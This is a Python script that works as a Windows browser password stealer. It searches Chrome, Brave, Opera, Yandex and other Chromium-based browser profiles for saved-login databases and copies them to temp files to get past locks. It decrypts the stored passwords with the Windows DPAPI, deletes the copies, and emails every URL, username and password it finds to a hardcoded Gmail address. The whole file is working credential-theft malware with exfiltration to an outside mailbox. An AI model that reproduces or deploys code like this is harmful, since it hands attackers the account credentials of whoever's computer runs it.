from paths import email
import shutil
import os
import random
import sqlite3
import traceback
import tempfile
import string
from win32crypt import CryptUnprotectData
from paths import browsers_path


class Chrome_based():
    def __init__(self, name, paths):
        self.database_query = 'SELECT action_url, username_value, password_value FROM logins'
        self.paths = paths if isinstance(paths, list) else [paths]
        self.name = name

    def get_database_dirs(self):
        """
        Return database directories for all profiles within all paths
        """
        databases = set()
        for path in browsers_path.full_paths(self.paths):
            if os.path.exists(path):

                possibilities = {'Default', ''}
                for possibility in possibilities:
                    try:
                        db_files = os.listdir(os.path.join(path, possibility))
                    except Exception:
                        continue
                    finally:
                        pass
                    for db in db_files:
                        if 'login data' in db.lower():
                            databases.add(os.path.join(path, possibility, db))
        return databases

    def get_credentials(self, db_path):
        """
        Export the crededentials
        """
        credentials = []

        try:
            conn = sqlite3.connect(db_path)
            curs = conn.cursor()
            curs.execute(self.database_query)
        except Exception as e:
            pass
            return credentials
        for url, login, password in curs.fetchall():
            try:
                password = CryptUnprotectData(password, None, None, None, 0)[1].decode('UTF-8')
                if not url and not login and not password:
                    continue
                credentials.append((url, login, password))
            except Exception:
                pass
        conn.close()
        return credentials

    def copy_db(self, database_path):
        """
        Bypassing lock errors
        """
        random_name = ''.join([random.choice(string.ascii_lowercase) for i in range(9)])
        root_dir = [
            tempfile.gettempdir(),
            os.environ.get('PUBLIC', None),
            os.environ.get('SystemDrive', None) + '\\',
        ]
        for r in root_dir:

            try:
                temp = os.path.join(r, random_name)
                shutil.copy(database_path, temp)
                return temp
            except Exception as e:
                continue
            finally:
                pass
        return False

    def clean_file(self, db_path):
        try:
            os.remove(db_path)
        except Exception as e:
            pass

    def run(self):
        info = []
        for database_path in self.get_database_dirs():
            if database_path.endswith('Login Data-journal'):
                continue
            path = self.copy_db(database_path)
            if path:
                try:
                    if not self.get_credentials(path):
                        continue
                    info.extend(self.get_credentials(path))
                except Exception as e:
                    pass
            self.clean_file(path)
        return [{'Url': url, 'Login': login, 'Password': password} for url, login, password in info]


chromium_browsers = [
    (u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
    (u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
    (u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
    (u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
    (u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
    (u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
    (u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
    (u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
    (u'comodo dragon', u'{LOCALAPPDATA}\\Comodo\\Dragon\\User Data'),  # Comodo IceDragon is Firefox-based
    (u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
    (u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
    (u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
    (u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
    (u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
    (u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
    (u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
    (u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
    (u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
    (u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data'),
    (u'yandexBrowser', u'{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data'),
    (u'Avast', u'{LOCALAPPDATA}\\AVAST Software\\Browser\\User Data')
]

#subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

data = ''
list_browsers = [Chrome_based(name=br_name, paths=paths) for br_name, paths in chromium_browsers]
for browser in list_browsers:
    if browser.run():
        for credentials in browser.run():
            if 'accounts.google.com/signin' in credentials["Url"]:
                data += 'Url- ' + 'Google' + '\n'
            else:
                data += '\n' + 'Url- ' + credentials["Url"] + '\n'
            data += 'Login- ' + credentials["Login"] + '\n'
            data += 'Password- ' + credentials["Password"] + '\n'
            data += '\n' + '\n'

email.send_email('hacktuesexx@gmail.com', 'hacktuesEXAMPLE', data)
